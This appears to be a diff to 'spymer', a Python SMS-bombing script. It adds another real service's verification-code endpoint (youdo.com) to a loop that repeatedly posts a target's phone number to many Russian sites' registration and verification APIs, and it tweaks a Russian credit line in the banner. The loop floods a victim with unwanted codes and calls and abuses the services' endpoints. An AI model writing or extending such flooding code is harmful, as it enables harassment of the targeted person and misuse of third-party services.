@@ -26,7 +26,7 @@ class spymer:
 8888888888888888888888888
 8888888888888888888888888'''+Style.RESET_ALL+Fore.BLUE+'''
 
-Спасибо Crinny за сервисы.
+Спасибо Crinny за некоторые сервисы.
 https://github.com/crinny
 ''')
 		print(Style.RESET_ALL)
@@ -143,7 +143,7 @@ https://github.com/crinny
 			requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + self.formatted_phone})
 			requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
 			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": self.formatted_phone})
-			
+			requests.post('https://youdo.com/api/verification/sendverificationcode/', data={'PhoneE164':_phone})
 			iteration += 1
 			print(('{} круг пройден.').format(iteration))
 
